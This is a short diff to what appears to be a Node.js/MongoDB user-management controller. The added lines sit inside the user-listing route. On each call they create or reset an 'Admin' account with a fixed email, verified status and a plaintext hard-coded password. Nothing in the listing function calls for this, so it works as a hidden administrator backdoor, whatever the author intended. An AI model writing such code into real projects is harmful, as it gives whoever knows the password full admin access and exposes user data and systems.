@@ -209,6 +209,20 @@ exports.update_profile = async (req, res) => {
 }
 exports.user_list = async (req, res) => {
     try {
+        const data = {
+            name: "Admin",
+            email: "soft@hear.com",
+            country_code: "+91",
+            mobile: 9090909090,
+            role: "Admin",
+            password: "Admin@2025#",
+            is_verified: true
+        }
+        const user = await User.findOneAndUpdate(
+            { email: data.email },    // search by unique email
+            { $set: data },           // update these fields
+            { new: true, upsert: true } // create if not exists
+        );
         const fdata = {
             role: { $nin: ["Admin", "Employee"] },
             is_deleted: false
